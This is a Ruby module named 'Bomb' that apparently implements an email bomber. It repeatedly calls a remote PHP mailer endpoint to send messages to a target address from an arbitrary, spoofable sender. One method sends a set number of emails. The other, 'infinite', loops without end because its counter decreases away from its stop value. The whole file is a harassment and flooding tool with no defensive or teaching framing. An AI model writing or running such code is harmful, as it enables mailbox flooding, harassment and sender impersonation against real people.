module Bomb
  def Bomb.input(email, target, subject, message, amount)
    starting_num = 1
    amount = amount += 1
    while starting_num != amount do
  		@data = URI.parse("http://example.com/lightdafuse.php?from=#{email}&to=#{target}&subject=#{subject}&message=#{message}").read
  		puts "Sent email to #{target} from #{email}"
  		starting_num += 1
  	end
  end
  def Bomb.infinite(email, target, subject, message)
    max = 100
    min = 10
    while min != max do
  		@data = URI.parse("http://example.com/lightdafuse.php?from=#{email}&to=#{target}&subject=#{subject}&message=#{message}").read
  		puts "Sent email to #{target} from #{email}"
  		min -= 1
  	end
  end
end
